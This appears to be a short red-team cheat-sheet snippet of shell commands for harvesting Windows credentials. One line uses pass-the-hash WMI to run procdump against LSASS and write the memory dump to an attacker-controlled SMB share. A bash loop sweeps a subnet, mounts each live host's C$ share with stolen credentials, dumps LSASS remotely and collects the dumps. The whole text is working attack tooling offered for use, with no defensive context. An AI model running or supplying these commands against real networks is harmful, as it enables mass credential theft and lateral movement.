pth-wmis -U DOMAIN\\USERNAME%PASSWORD_OR_HASH //TARGET_IP "\\\\RTA_IP\\SHARE_NAME\\procdump.exe -ma -accepteula lsass.exe \\\\RTA_IP\\SHARE_NAME\\TARGET_IP.dmp"

** Be sure procdump is in /home/data/procdump.exe, or edit the path in the script
mkdir tempmnt; mkdir lsass--dumps
for m in {1..254}; do ping -c 1 -w 2 <FIRST_THREE_OCTETS>.$m | grep "bytes from" && (mount -t cifs -o username=<USERNAME>,password=<PASSWORD> //<FIRST_THREE_OCTETS>.$m/c$ ./tempmnt/ && (sleep 2; cp -v /home/data/procdump.exe tempmnt/Windows/Temp/; pth-wmis -U <DOMAIN>\\<USERNAME>%'<PASSWORD>' //<FIRST_THREE_OCTETS>.$m "cmd.exe /c c:\Windows\Temp\procdump.exe -ma -accepteula lsass.exe C:\Windows\Temp\<FIRST_THREE_OCTETS>.$m.dmp"; while $(pth-wmic -U <DOMAIN>\\<USERNAME>%'<PASSWORD>' //<FIRST_THREE_OCTETS>.$m 'select name from win32_process where name="procdump.exe"' | grep -i procdump); do echo sleeping; sleep 5; done; mv tempmnt/Windows/Temp/<FIRST_THREE_OCTETS>.$m.dmp lsass-dumps; rm tempmnt/Windows/Temp/procdump*.*; umount tempmnt;)); done;
